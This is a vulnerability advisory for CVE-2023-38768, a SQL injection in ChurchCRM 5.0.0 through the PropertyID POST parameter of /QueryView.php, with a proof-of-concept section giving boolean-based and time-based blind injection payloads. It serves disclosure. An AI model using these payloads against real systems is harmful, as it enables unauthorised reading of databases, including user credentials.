# CVE-2023-38768 - SQL Injection in /QueryView.php?QueryID=9

|                 |                                                                                      |
| --------------- | --------------- |
| Researchers     | Rowan Crowley                                                               |
| Severity        | TBD                                   |
| Published       | TBD         |
| Software Link   | https://github.com/ChurchCRM/CRM             |

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the `PropertyID` parameter within the `/QueryView.php` endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the `PropertyID` parameter at the `/QueryView.php?QueryID=9` endpoint (Person by Property query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
    Parameter: PropertyID (POST)
        Type: boolean-based blind
        Title: Boolean-based blind - Parameter replace (original value)
        Payload: PropertyID=(SELECT (CASE WHEN (5212=5212) THEN 12 ELSE (SELECT 2623 UNION SELECT 6824) END))&Submit=Execute Query
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: PropertyID=12 AND (SELECT 6569 FROM (SELECT(SLEEP(5)))KelA)&Submit=Execute Query

